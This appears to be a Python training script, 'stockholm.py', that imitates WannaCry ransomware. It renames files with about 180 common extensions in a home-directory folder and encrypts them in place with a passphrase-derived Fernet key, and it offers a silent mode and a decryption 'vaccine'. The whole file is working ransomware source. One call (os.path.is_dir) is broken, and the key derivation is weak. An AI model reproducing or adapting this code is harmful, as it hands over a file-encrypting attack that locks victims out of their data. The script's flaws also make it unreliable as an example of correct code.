
import os
import contextlib
from cryptography.fernet import Fernet
import base64
import argparse

#########################################################
# Set secret key (min 16 chars)                         #
#########################################################
secret_key = "stockholm project"

#########################################################
# Set infected target folder                            #
#########################################################
#user = os.getenv("USERNAME", None) # for windows
user = os.getenv("USER", None)  # for linux
folder_to_be_infected = f"/home/{user}/infection"

#########################################################
# Function to walk target folder and process all target #
# files (renaming + encryption)                         #
#########################################################
def encrypt_folder(path:str):
    
    file_extensions = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai', '.arc', '.asc', '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cab', '.cc', '.cdr', '.cer', '.cfg', '.cfgx', '.chm', '.class', '.cmd', '.cpp', '.crt', '.cs', '.csr', '.csv', '.db', '.dbf', '.dch', '.dif', '.dip', '.djvu', '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dsp', '.dvd', '.dwg', '.eml', '.fla', '.flv', '.frm', '.gif', '.gpg', '.h', '.hpp', '.htm', '.html', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js', '.jsp', '.key', '.lay', '.lay6', '.ldf', '.lic', '.lnk', '.m', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml', '.mov', '.mp3', '.mp4', '.mpeg', '.mpg', '.ms11', '.ms11 (Security copy)', '.mscz', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt', '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.p12', '.paq', '.pas', '.pdf', '.pem', '.php', '.pl', '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1', '.psd', '.pst', '.pub', '.py', '.pyc', '.pyw', '.qcow2', '.rar', '.rb', '.rtf', '.sch', '.sh', '.sln', '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.stw', '.svg', '.swf', '.sxc', '.sxd', '.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd', '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.wpd', '.wps', '.x11', '.x3f', '.xis', '.xla', '.xlam', '.xlk', '.xlm', '.xlr', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.xml', '.xps', '.xxx', '.zip']

    encrypted_files_counter = 0

    if len(secret_key) < 16:
        print(f"The secret key used must be at least 16 chars long. Goodbye.")
        exit(1)
    
    if not os.path.is_dir(path):
        return f"Target folder '{path}' does not exist. Aborting infection."
    
    print("======================================================================================")
    print(" ENCRYPTIMG FILES - RUINING YOUR WORLD!") 
    print("======================================================================================")
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            file_name, file_extension = os.path.splitext(file)

            ## Process file with target extension
            if file_extension.lower() in file_extensions and not file_extension.lower() == '.ft':
            
                print(f"Processing file : '{file_path}'", end="...")
            
                # add '.ft' extension to target file
            
                file_to_be_encrypted = add_ft_ext(file_path)
                if (file_to_be_encrypted): 
                    print(f"File renamed successfully to '{file_path}'", end="...")
                else:
                    continue
                
            ## Process file with '.ft' extension
            elif file_extension.lower() == '.ft':
                print(f"Processing file : '{file_path}'", end="...")
                print(f"File renaming not required", end="...")
                file_to_be_encrypted = file_path

            else:
                continue
                
            # encrypt target file
            result = encrypt_file(file_to_be_encrypted, secret_key)
            if (not result):
                print(f"File encryption failed. Reverting file extension back to original", end="...")
                del_ft_ext(file_to_be_encrypted)
                continue
            
            encrypted_files_counter += 1
    
    print("======================================================================================")                      
    print(f"Encryption process completed. {encrypted_files_counter} files in target folder '{path}' were encrypted")
    print("======================================================================================")
    return

#########################################################
# Function to add '.ft' extension to target file        #
#########################################################
def add_ft_ext(file_to_be_renamed:str)-> str:

    new_file_path = file_to_be_renamed +'.ft'
    try: 
        os.rename(file_to_be_renamed, new_file_path)
        return new_file_path
    except Exception as e:
        print(f"Renaming failed. File will not be encrypted.")
        return False
              
#########################################################
# Function to revert file extension to original         #
#########################################################
def del_ft_ext(file_to_be_renamed:str)-> bool | str:
    
    # split '.ft' extension from file_to_be_renamed
    file_name, file_extension = os.path.splitext(file_to_be_renamed)
    
    # check if once the ext is removed, there is no other ext,
    # meaning the file had originally the '.ft' ext
    file_name2, file_extension2 = os.path.splitext(file_name)
    if file_extension2 == "":
        print("Reverting not required", end="...")
        return file_to_be_renamed
    
    new_file_path = file_name
    try: 
        os.rename(file_to_be_renamed, new_file_path)
        print("Reverted file extension successfully", end="...")
        return new_file_path
    except Exception as e:
        print(f"Reverting failed", end="...")
        return False

#########################################################
# Function to encrypt a target file                     #
#########################################################
def encrypt_file(file_to_be_encrypted:str, secret_key:str)->bool | list:

    # make they key 32 url-safe base64-encoded bytes
    key = secret_key.encode('utf-8')
    while len(key) < 32:
        key += key
    key = key[:32]
    
    cipher = Fernet(base64.urlsafe_b64encode(key))

    try:
        with open(file_to_be_encrypted, 'rb') as file:
            file_data = file.read()

        encrypted_data = cipher.encrypt(file_data)

        with open(file_to_be_encrypted, 'wb') as file:
            file.write(encrypted_data)
            
        print(f"File encrypted successfully.")
        return True
    except Exception as e:
        return False

#########################################################
# Function to decrypt an encrypted file                 #
#########################################################
def decrypt_file(file_to_be_decrypted:str, user_secret_key:str)->bool:

    # make they key 32 url-safe base64-encoded bytes
    key = user_secret_key.encode('utf-8')
    while len(key) < 32:
        key += key
    key = key[:32]
    
    cipher = Fernet(base64.urlsafe_b64encode(key))

    try:
        with open(file_to_be_decrypted, 'rb') as file:
            file_data = file.read()

        try:
            decrypted_data = cipher.decrypt(file_data)
        except Exception as e:
            print(f"Wrong secret key. Aborting process.\n")
            exit(1)

        with open(file_to_be_decrypted, 'wb') as file:
            file.write(decrypted_data)
            
        print(f"File decrypted successfully.")
        return True
    except Exception as e:
        return False

#########################################################
# Function to walk target folder and de-process all     #
# infected files (reverting renaming + decryption)      #
#########################################################
def decrypt_folder(path:str, user_secret_key:str):
    
    decrypted_files_counter = 0

    print("======================================================================================")
    print(" DECRYPTIMG FILES - SAVNIG THE WORLD!")
    print("======================================================================================")
    
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            file_name, file_extension = os.path.splitext(file)

            ## Process infected file 
            if file_extension.lower() == '.ft':
            
                print(f"Processing file : '{file_path}'", end="...")
            
                # revert '.ft' extension from target file
                file_to_be_decrypted = del_ft_ext(file_path)
                if (not file_to_be_decrypted): 
                    continue
            else:
                continue
                
            # decrypt infected file
            result = decrypt_file(file_to_be_decrypted, user_secret_key)
            if (not result):
                print(f"File decryption failed. Reverting file extension back to infected state", end="...")
                add_ft_ext(file_to_be_decrypted)
                continue
            
            decrypted_files_counter += 1
    
    print("======================================================================================")                       
    print(f"Decryption process completed. {decrypted_files_counter} files in target folder '{path}' were decrypted")
    print("======================================================================================")
    return

####################################################
# Helper function to clean screen at execution time
####################################################
def clean():
    # For Windows
    if os.name == 'nt':
        _ = os.system('cls')
    # For macOS and Linux
    else:
        _ = os.system('clear')
   
######################################
# MAIN
######################################
def main():
    
    # handle arguments input by user
    parser = argparse.ArgumentParser(description="(stockholm.py) This is a script aimed to infect the user's '/home/$USER/infection' folder \
        causing the same effects as WannaCry virus did to thousands of users back in 2017. Basically, the script renames and encrypts \
        using symmetric key encryption all files matching certain extensions.\nFortunately, this timearound the script includes also the \
        vaccine. (2023, Eduard Vendrell)")
    
    # Definir los argumentos y opciones
    parser.add_argument('-version', '-v', action='store_true', help='prints application version.')
    parser.add_argument('-infect', '-i', metavar='"Secret Key"', help="Ruin somebody's world by infecting critical folder files.")
    parser.add_argument('-reverse', '-r', metavar='"Secret Key"', help="Save somebody's world by recovering all infected folder files.")
    parser.add_argument('-silent', '-s', action='store_true', help='infects target folder files in silence, with no print outs.')

    args = parser.parse_args()

    if args.version:
        print('stockholm.py - Version 1.0\n')
    
    elif args.reverse:
        user_secret_key = args.reverse
        
        # check if infection folder exists
        if not os.path.isdir(folder_to_be_infected):
            print(f"Target folder '{folder_to_be_infected}' does not exist. Aborting disinfection.")
            exit(1)        
        
        # cause relieve!!
        if args.silent:
            with contextlib.redirect_stdout(None):
                decrypt_folder(folder_to_be_infected, user_secret_key)
        else:
            decrypt_folder(folder_to_be_infected, user_secret_key)
    
    elif args.infect:
        # validate Secrte Key
        if len(args.infect) < 16:
            print('Secret key must be at least 16 chars long.')
        
        # check if infection folder exists
        if not os.path.isdir(folder_to_be_infected):
            print(f"Target folder '{folder_to_be_infected}' does not exist. Aborting infection.")
            exit(1)
        
        else:
            global secret_key
            secret_key = args.infect
            
            # cause havoc!!!
            if args.silent:
                with contextlib.redirect_stdout(None):                   
                    #encrypt_folder("./infection")
                    encrypt_folder(folder_to_be_infected)
                    
            else:
                encrypt_folder(folder_to_be_infected)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()